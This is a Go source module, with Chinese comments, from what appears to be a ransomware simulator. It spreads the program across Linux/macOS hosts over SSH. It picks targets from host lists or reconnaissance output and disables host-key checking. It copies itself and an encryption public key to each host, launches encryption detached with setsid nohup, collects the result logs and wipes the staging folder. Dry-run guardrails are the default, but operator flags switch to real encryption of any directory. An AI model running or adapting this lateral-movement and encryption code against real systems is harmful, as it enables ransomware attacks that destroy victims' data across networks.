// ransom_simulator_linux_remote.go
// 远程横向加密编排模块（Linux/macOS 控制器，SSH 通道）：
//   1) 目标解析：--remote-hosts / --remote-hosts-file / --remote-auto（消费侦察结果）
//   2) 通道：ssh（口令认证依赖 sshpass，推荐 --remote-key 私钥认证）+ scp 投递
//   3) 载荷：投递本程序自身 + public_key_<uuid>.pem 到远端暂存目录执行
//   4) 回收：拉回远端 success/failed 日志，输出 remote_report_<ts>.json
//
// 安全护栏：默认（未加 --remote-confirm）只做连通性 + 投递演练，远端以 -dry-run 运行；
// 全局 -dry-run 时所有远程动作自动降级为演习；-remove 不会自动透传到远端。
package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

const (
	defaultRemoteStaging = "/tmp/.rs_sim"
	remotePayloadName    = "rs_sim_payload"
	remoteSandboxName    = "target"
	remoteConnectTimeout = 3 * time.Second
)

type remoteTarget struct {
	User string
	Host string
	Port int
}

func (t remoteTarget) String() string {
	if t.User != "" {
		return t.User + "@" + t.Host
	}
	return t.Host
}

type remoteResult struct {
	Target        string `json:"target"`
	Host          string `json:"host"`
	Port          int    `json:"port"`
	Reachable     bool   `json:"reachable"`
	Channel       string `json:"channel"`
	AuthOK        bool   `json:"auth_ok"`
	Staged        bool   `json:"staged"`
	Executed      bool   `json:"executed"`
	Mode          string `json:"mode"`
	LogsFetched   int    `json:"logs_fetched"`
	RemoteCommand string `json:"remote_command,omitempty"`
	Error         string `json:"error,omitempty"`
	Elapsed       string `json:"elapsed"`
}

type remoteReport struct {
	GeneratedAt string         `json:"generated_at"`
	Mode        string         `json:"mode"`
	Staging     string         `json:"staging"`
	Confirm     bool           `json:"confirm"`
	Args        string         `json:"remote_args"`
	DryRun      bool           `json:"local_dry_run"`
	Results     []remoteResult `json:"results"`
	JSONFile    string         `json:"json_report"`
}

// remoteMode 计算本次远程编排的执行模式
func remoteMode(opt *options) string {
	if opt.dryRun || !opt.remoteConfirm {
		return "dry-run"
	}
	if strings.EqualFold(opt.remoteMethod, "deploy-only") || strings.EqualFold(opt.remoteMethod, "smb") {
		return "stage-only"
	}
	return "execute"
}

// defaultRemotePort 依据通道推断默认端口（Linux/macOS 控制器仅支持 SSH 通道）
func defaultRemotePort(opt *options) int {
	if opt.remotePort > 0 {
		return opt.remotePort
	}
	return 22
}

// validateRemoteMethod 校验控制器支持的通道
func validateRemoteMethod(opt *options) error {
	m := strings.ToLower(strings.TrimSpace(opt.remoteMethod))
	switch m {
	case "", "auto", "ssh", "deploy-only", "smb":
		return nil
	default:
		return fmt.Errorf("Linux/macOS 控制器仅支持 ssh 通道（当前为 %q）；如需 SMB/WMI/schtasks/PsExec 请使用 Windows 控制端", opt.remoteMethod)
	}
}

// parseRemoteTarget 解析单个远程目标，支持 user@host / host:port / user@host:port
func parseRemoteTarget(item string, opt *options) remoteTarget {
	t := remoteTarget{Port: defaultRemotePort(opt)}

	if idx := strings.LastIndex(item, "@"); idx > 0 {
		t.User = item[:idx]
		item = item[idx+1:]
	}

	if idx := strings.LastIndex(item, ":"); idx > 0 && !strings.Contains(item[idx+1:], ":") {
		if p, err := strconv.Atoi(item[idx+1:]); err == nil {
			t.Port = p
			item = item[:idx]
		}
	}

	t.Host = strings.TrimSpace(item)
	if t.User == "" {
		t.User = opt.remoteUser
	}
	return t
}

// parseRemoteHosts 汇总远程目标：清单文件 + 命令行 + 侦察结果(--remote-auto)
func parseRemoteHosts(opt *options, recon *reconReport) ([]remoteTarget, error) {
	var raw []string

	if f := strings.TrimSpace(opt.remoteHostsFile); f != "" {
		data, err := os.ReadFile(f)
		if err != nil {
			return nil, fmt.Errorf("读取远程目标清单失败: %w", err)
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			raw = append(raw, line)
		}
	}

	if s := strings.TrimSpace(opt.remoteHosts); s != "" {
		for _, part := range strings.Split(s, ",") {
			part = strings.TrimSpace(part)
			if part != "" {
				raw = append(raw, part)
			}
		}
	}

	if opt.remoteAuto {
		if recon == nil {
			fmt.Println("[!] --remote-auto 需要先执行侦察（请同时启用 --scan）")
		} else {
			added := 0
			for _, h := range recon.Hosts {
				if h.Alive && remoteReady(h) {
					raw = append(raw, h.Host)
					added++
				}
			}
			fmt.Printf("[*] --remote-auto: 从侦察结果中选取 %d 台具备远程投递条件的主机\n", added)
		}
	}

	seen := map[string]bool{}
	var targets []remoteTarget
	for _, item := range raw {
		t := parseRemoteTarget(item, opt)
		if t.Host == "" {
			continue
		}
		key := t.String() + ":" + strconv.Itoa(t.Port)
		if seen[key] {
			continue
		}
		seen[key] = true
		targets = append(targets, t)
	}

	if len(targets) == 0 {
		return nil, fmt.Errorf("未指定任何远程目标（请使用 --remote-hosts / --remote-hosts-file / --remote-auto）")
	}
	return targets, nil
}

// checkReachable 探测远程目标端口可达性
func checkReachable(t remoteTarget) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(t.Host, strconv.Itoa(t.Port)), remoteConnectTimeout)
	if err != nil {
		return false
	}
	_ = conn.Close()
	return true
}

// ensureLocalPublicKeyFile 确保程序目录存在 public_key_<uuid>.pem，供远端投递使用
func ensureLocalPublicKeyFile(uuid, pemContent string) (string, error) {
	if strings.TrimSpace(uuid) == "" || strings.TrimSpace(pemContent) == "" {
		return "", fmt.Errorf("UUID 或公钥内容为空")
	}
	target := filepath.Join(programDir, fmt.Sprintf("public_key_%s.pem", uuid))
	if data, err := os.ReadFile(target); err == nil && strings.TrimSpace(string(data)) == strings.TrimSpace(pemContent) {
		return target, nil
	}
	if err := os.WriteFile(target, []byte(pemContent), 0644); err != nil {
		return "", fmt.Errorf("写入本地公钥文件失败: %w", err)
	}
	fmt.Printf("[*] 已生成本地公钥文件用于投递: %s\n", target)
	return target, nil
}

// sanitizeHostName 把主机名转换为可用于文件名的安全字符串
func sanitizeHostName(host string) string {
	var sb strings.Builder
	for _, r := range host {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '.', r == '-', r == '_':
			sb.WriteRune(r)
		default:
			sb.WriteRune('_')
		}
	}
	return sb.String()
}

// splitArgs 以空白切分 --remote-args 字符串
func splitArgs(s string) []string {
	return strings.Fields(s)
}

// quoteIfSpace 参数含空白时用单引号包裹（远端为 sh）
func quoteIfSpace(s string) string {
	if strings.ContainsAny(s, " \t'\"") {
		return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
	}
	return s
}

// buildRemoteArgs 构造远端 encryptor 的运行参数
// 默认目标目录为暂存目录下的沙箱（target），避免误伤远端真实数据；
// 操作员可通过 --remote-args 追加 -dir 等参数覆盖（flag 后者覆盖前者）
func buildRemoteArgs(opt *options, mode string) string {
	target := strings.TrimRight(opt.remoteStaging, "/") + "/" + remoteSandboxName
	parts := []string{"-log", "-dir", target}
	if mode != "execute" {
		parts = append(parts, "-dry-run")
	}
	if extra := strings.TrimSpace(opt.remoteArgs); extra != "" {
		parts = append(parts, splitArgs(extra)...)
	}
	for i, p := range parts {
		parts[i] = quoteIfSpace(p)
	}
	return strings.Join(parts, " ")
}

// methodLabel 通道显示名
func methodLabel(method string) string {
	m := strings.ToLower(strings.TrimSpace(method))
	switch m {
	case "":
		return "auto (ssh)"
	case "deploy-only", "smb":
		return "deploy-only (仅投递)"
	default:
		return m
	}
}

// modeLabel 执行模式显示名
func modeLabel(mode string) string {
	switch mode {
	case "execute":
		return "真实执行 (--remote-confirm 已启用)"
	case "stage-only":
		return "仅投递 (method=deploy-only)"
	default:
		return "演练模式 (默认护栏)"
	}
}

// sshCommonArgs 构造 ssh/scp 公共参数（scp 使用 -P 指定端口）
func sshCommonArgs(t remoteTarget, opt *options, portFlag string) []string {
	batch := "yes"
	if strings.TrimSpace(opt.remotePass) != "" {
		batch = "no" // 口令认证需要允许交互提示，由 sshpass 应答
	}
	args := []string{
		"-o", "BatchMode=" + batch,
		"-o", "StrictHostKeyChecking=no",
		"-o", "UserKnownHostsFile=/dev/null",
		"-o", "ConnectTimeout=6",
		portFlag, strconv.Itoa(t.Port),
	}
	if opt.remoteKey != "" {
		args = append(args, "-i", opt.remoteKey)
	}
	return args
}

// sshPasswordPrefix 口令认证前缀（依赖 sshpass）
func sshPasswordPrefix(opt *options) ([]string, error) {
	if strings.TrimSpace(opt.remotePass) == "" {
		return nil, nil
	}
	tool := resolveToolPath("sshpass")
	if tool == "" {
		return nil, fmt.Errorf("口令认证需要 sshpass（未安装），请改用 --remote-key 私钥认证")
	}
	return []string{tool, "-p", opt.remotePass}, nil
}

// runSSH 在远端执行命令并返回输出
func runSSH(t remoteTarget, opt *options, remoteCmd string) (string, error) {
	sshPath := resolveToolPath("ssh")
	if sshPath == "" {
		return "", fmt.Errorf("未找到 ssh 客户端")
	}
	prefix, err := sshPasswordPrefix(opt)
	if err != nil {
		return "", err
	}

	args := append(prefix, sshPath)
	args = append(args, sshCommonArgs(t, opt, "-p")...)
	args = append(args, t.String(), remoteCmd)

	out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
	text := strings.TrimSpace(string(out))
	if err != nil {
		return text, fmt.Errorf("ssh 执行失败: %v (%s)", err, text)
	}
	return text, nil
}

// scpTransfer 上传/下载单个文件
func scpTransfer(t remoteTarget, opt *options, localPath, remotePath string, upload bool) error {
	scpPath := resolveToolPath("scp")
	if scpPath == "" {
		return fmt.Errorf("未找到 scp 客户端")
	}
	prefix, err := sshPasswordPrefix(opt)
	if err != nil {
		return err
	}

	args := append(prefix, scpPath)
	args = append(args, sshCommonArgs(t, opt, "-P")...)
	if upload {
		args = append(args, localPath, t.String()+":"+remotePath)
	} else {
		args = append(args, t.String()+":"+remotePath, localPath)
	}

	out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
	if err != nil {
		return fmt.Errorf("scp 传输失败: %v (%s)", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// sshAuthCheck 验证 SSH 认证可用性
func sshAuthCheck(t remoteTarget, opt *options) error {
	out, err := runSSH(t, opt, "echo RS_SIM_OK")
	if err != nil {
		return fmt.Errorf("SSH 认证失败: %v", err)
	}
	if !strings.Contains(out, "RS_SIM_OK") {
		return fmt.Errorf("SSH 认证异常，未收到预期响应: %s", out)
	}
	return nil
}

// stagePayloadViaSSH 通过 scp 投递载荷、公钥与沙箱文件到远端暂存目录
func stagePayloadViaSSH(t remoteTarget, opt *options, payload, keyFile string) (string, error) {
	workDir := strings.TrimRight(opt.remoteStaging, "/")

	if _, err := runSSH(t, opt, fmt.Sprintf("mkdir -p %s %s", shellQuote(workDir), shellQuote(workDir+"/"+remoteSandboxName))); err != nil {
		return "", fmt.Errorf("创建远端暂存目录失败: %w", err)
	}

	payloadRemote := workDir + "/" + remotePayloadName
	if err := scpTransfer(t, opt, payload, payloadRemote, true); err != nil {
		return "", fmt.Errorf("投递载荷失败: %w", err)
	}
	if _, err := runSSH(t, opt, "chmod 755 "+shellQuote(payloadRemote)); err != nil {
		return "", fmt.Errorf("设置载荷可执行权限失败: %w", err)
	}

	if keyFile != "" {
		if err := scpTransfer(t, opt, keyFile, workDir+"/"+filepath.Base(keyFile), true); err != nil {
			fmt.Printf("    [!] 公钥投递失败（远端可自行联网获取密钥）: %v\n", err)
		}
	}

	// 说明文件与沙箱样例文件（便于远端负责人识别为受控演练）
	notesLocal := filepath.Join(os.TempDir(), "rs_sim_remote_notes.txt")
	notesContent := fmt.Sprintf("安全检查模拟演练 - 远程投递说明\n控制端: %s\n投递时间: %s\n用途: 安全培训/防御演练\n",
		mustHostname(), time.Now().Format("2006-01-02 15:04:05"))
	if err := os.WriteFile(notesLocal, []byte(notesContent), 0644); err == nil {
		_ = scpTransfer(t, opt, notesLocal, workDir+"/remote_notes.txt", true)
	}
	sampleCmd := fmt.Sprintf("test -f %s || echo 'remote sandbox sample' > %s",
		shellQuote(workDir+"/"+remoteSandboxName+"/remote_sandbox_sample.txt"),
		shellQuote(workDir+"/"+remoteSandboxName+"/remote_sandbox_sample.txt"))
	_, _ = runSSH(t, opt, sampleCmd)

	return workDir, nil
}

// writeRemoteRunnerScript 生成并投递远端执行脚本 run.sh
func writeRemoteRunnerScript(t remoteTarget, opt *options, remoteArgs string) (string, error) {
	workDir := strings.TrimRight(opt.remoteStaging, "/")
	scriptRemote := workDir + "/run.sh"
	scriptLocal := filepath.Join(os.TempDir(), "rs_sim_run.sh")

	content := "#!/bin/sh\n" +
		"cd " + shellQuote(workDir) + "\n" +
		"./" + remotePayloadName + " " + remoteArgs + "\n"
	if err := os.WriteFile(scriptLocal, []byte(content), 0755); err != nil {
		return "", fmt.Errorf("写入本地执行脚本失败: %w", err)
	}
	if err := scpTransfer(t, opt, scriptLocal, scriptRemote, true); err != nil {
		return "", fmt.Errorf("投递执行脚本失败: %w", err)
	}
	if _, err := runSSH(t, opt, "chmod 755 "+shellQuote(scriptRemote)); err != nil {
		return "", fmt.Errorf("设置执行脚本权限失败: %w", err)
	}
	return scriptRemote, nil
}

// fetchRemoteLogs 回收远端生成的日志文件
func fetchRemoteLogs(t remoteTarget, opt *options) int {
	workDir := strings.TrimRight(opt.remoteStaging, "/")
	count := 0
	for _, name := range []string{"success_encrypted.log", "failed_encrypted.log", "operations.log"} {
		remotePath := workDir + "/" + name
		if _, err := runSSH(t, opt, "test -f "+shellQuote(remotePath)); err != nil {
			continue
		}
		dst := filepath.Join(programDir, fmt.Sprintf("remote_%s_%s", sanitizeHostName(t.Host), name))
		if err := scpTransfer(t, opt, dst, remotePath, false); err == nil {
			count++
			fmt.Printf("    - 已回收 %s -> %s\n", name, dst)
		}
	}
	return count
}

// cleanupRemoteStaging 删除远端暂存目录
func cleanupRemoteStaging(t remoteTarget, opt *options) {
	workDir := strings.TrimRight(opt.remoteStaging, "/")
	if _, err := runSSH(t, opt, "rm -rf "+shellQuote(workDir)); err != nil {
		fmt.Printf("    [!] 清理远端暂存目录失败: %v\n", err)
		return
	}
	fmt.Println("    - 远端暂存目录已清理")
}

// processRemoteTarget 处理单台远程主机：可达性 -> 认证 -> 投递 -> 执行 -> 回收 -> 清理
func processRemoteTarget(t remoteTarget, opt *options, payload, keyFile, mode, remoteArgs string) remoteResult {
	res := remoteResult{Target: t.String(), Host: t.Host, Port: t.Port, Mode: mode}
	fmt.Printf("\n[*] 目标 %s (端口 %d)\n", t.String(), t.Port)

	if !checkReachable(t) {
		res.Error = fmt.Sprintf("TCP %d 不可达", t.Port)
		fmt.Printf("    [!] %s\n", res.Error)
		return res
	}
	res.Reachable = true
	fmt.Printf("    [+] 端口 %d 可达\n", t.Port)

	if err := sshAuthCheck(t, opt); err != nil {
		res.Error = err.Error()
		fmt.Printf("    [!] %s\n", res.Error)
		return res
	}
	res.AuthOK = true
	fmt.Println("    [+] SSH 认证成功")

	workDir, err := stagePayloadViaSSH(t, opt, payload, keyFile)
	if err != nil {
		res.Error = err.Error()
		fmt.Printf("    [!] %s\n", res.Error)
		return res
	}
	res.Staged = true
	fmt.Printf("    [+] 载荷已投递到 %s\n", workDir)

	method := strings.ToLower(strings.TrimSpace(opt.remoteMethod))
	stageOnly := mode == "stage-only" || method == "deploy-only" || method == "smb"
	if stageOnly {
		res.Channel = "ssh (仅投递)"
		fmt.Println("    [*] deploy-only: 跳过远程执行（仅投递演练）")
	} else {
		scriptRemote, err := writeRemoteRunnerScript(t, opt, remoteArgs)
		if err != nil {
			res.Error = err.Error()
			fmt.Printf("    [!] %s\n", res.Error)
			return res
		}
		runCmd := fmt.Sprintf("cd %s && setsid nohup ./run.sh > run.log 2>&1 < /dev/null & echo started",
			shellQuote(workDir))
		out, err := runSSH(t, opt, runCmd)
		if err != nil {
			res.Error = err.Error()
			fmt.Printf("    [!] %s\n", res.Error)
		} else {
			res.Executed = true
			res.Channel = "ssh"
			res.RemoteCommand = "sh " + scriptRemote
			fmt.Printf("    [+] 远程执行已下发 (%s)\n", strings.TrimSpace(out))
			// 等待远端进程落盘日志
			time.Sleep(5 * time.Second)
		}
	}

	res.LogsFetched = fetchRemoteLogs(t, opt)
	if res.LogsFetched == 0 && res.Executed {
		fmt.Println("    [i] 暂未回收到远端日志（远端执行可能仍在进行，可稍后重试或用 ssh 手动查看）")
	}

	if opt.remoteCleanup {
		cleanupRemoteStaging(t, opt)
	}
	return res
}

// mustHostname 获取本机主机名（失败返回 unknown）
func mustHostname() string {
	if h, err := os.Hostname(); err == nil {
		return h
	}
	return "unknown"
}

// runRemoteEncryption 远程横向加密编排入口
func runRemoteEncryption(opt *options, recon *reconReport, pemPath string) *remoteReport {
	fmt.Println("\n[阶段 5: 远程横向加密编排]")

	if err := validateRemoteMethod(opt); err != nil {
		fmt.Printf("[!] %v\n", err)
		if logEnabled {
			logOperation(fmt.Sprintf("远程编排终止: %v", err))
		}
		return nil
	}

	mode := remoteMode(opt)
	report := &remoteReport{
		GeneratedAt: time.Now().Format("2006-01-02 15:04:05"),
		Mode:        mode,
		Staging:     opt.remoteStaging,
		Confirm:     opt.remoteConfirm,
		DryRun:      opt.dryRun,
	}

	targets, err := parseRemoteHosts(opt, recon)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		if logEnabled {
			logOperation(fmt.Sprintf("远程编排终止: %v", err))
		}
		return nil
	}

	report.Args = buildRemoteArgs(opt, mode)
	fmt.Printf("[*] 远程目标: %d 台, 通道: %s, 暂存目录: %s\n", len(targets), methodLabel(opt.remoteMethod), opt.remoteStaging)
	fmt.Printf("[*] 远端运行参数: %s\n", report.Args)
	fmt.Printf("[*] 执行模式: %s\n", modeLabel(mode))
	if mode != "execute" {
		fmt.Println("[!] 安全护栏: 未启用 --remote-confirm，远端将以 -dry-run 演练模式运行，不会真正加密远端数据")
	} else if opt.dryRun {
		fmt.Println("[!] 安全护栏: 全局 -dry-run 已启用，远程动作自动降级为演习")
	}
	if logEnabled {
		logOperation(fmt.Sprintf("开始远程编排: 目标 %d 台, 模式 %s, 参数 %s", len(targets), mode, report.Args))
	}

	payload, err := os.Executable()
	if err != nil {
		fmt.Printf("[!] 无法获取自身程序路径: %v\n", err)
		return nil
	}

	for _, t := range targets {
		start := time.Now()
		res := processRemoteTarget(t, opt, payload, pemPath, mode, report.Args)
		res.Elapsed = time.Since(start).Round(time.Millisecond).String()
		report.Results = append(report.Results, res)

		if logEnabled {
			logOperation(fmt.Sprintf("远程目标 %s: 可达=%v 认证=%v 投递=%v 执行=%v 回收日志=%d 错误=%s",
				res.Target, res.Reachable, res.AuthOK, res.Staged, res.Executed, res.LogsFetched, res.Error))
		}
	}

	printRemoteSummary(report)
	writeRemoteReport(report)
	return report
}

// printRemoteSummary 打印远程编排汇总表
func printRemoteSummary(report *remoteReport) {
	fmt.Println("\n[+] 远程编排结果:")
	fmt.Printf("  %-22s %-8s %-8s %-8s %-8s %-8s %s\n", "目标", "可达", "认证", "投递", "执行", "回收日志", "备注")
	for _, r := range report.Results {
		note := r.Error
		if note == "" {
			note = r.Channel
		}
		fmt.Printf("  %-22s %-8s %-8s %-8s %-8s %-8d %s\n",
			r.Target, boolMark(r.Reachable), boolMark(r.AuthOK), boolMark(r.Staged),
			boolMark(r.Executed), r.LogsFetched, note)
	}

	ok := 0
	for _, r := range report.Results {
		if r.Executed || r.Mode == "stage-only" && r.Staged {
			ok++
		}
	}
	fmt.Printf("[+] 远程汇总: 目标 %d 台, 成功下发 %d 台, 模式 %s\n", len(report.Results), ok, modeLabel(report.Mode))
}

// boolMark 布尔值转控制台标记
func boolMark(v bool) string {
	if v {
		return "✓"
	}
	return "✗"
}

// writeRemoteReport 输出远程编排 JSON 报告
func writeRemoteReport(report *remoteReport) {
	jsonPath := filepath.Join(programDir, "remote_report_"+time.Now().Format("20060102_150405")+".json")
	report.JSONFile = jsonPath

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		fmt.Printf("[!] 序列化远程报告失败: %v\n", err)
		report.JSONFile = ""
		return
	}
	if err := os.WriteFile(jsonPath, data, 0644); err != nil {
		fmt.Printf("[!] 写入远程报告失败: %v\n", err)
		report.JSONFile = ""
		return
	}
	fmt.Printf("[+] 远程编排报告已生成: %s\n", jsonPath)
	if logEnabled {
		logOperation("远程编排报告已生成: " + jsonPath)
	}
}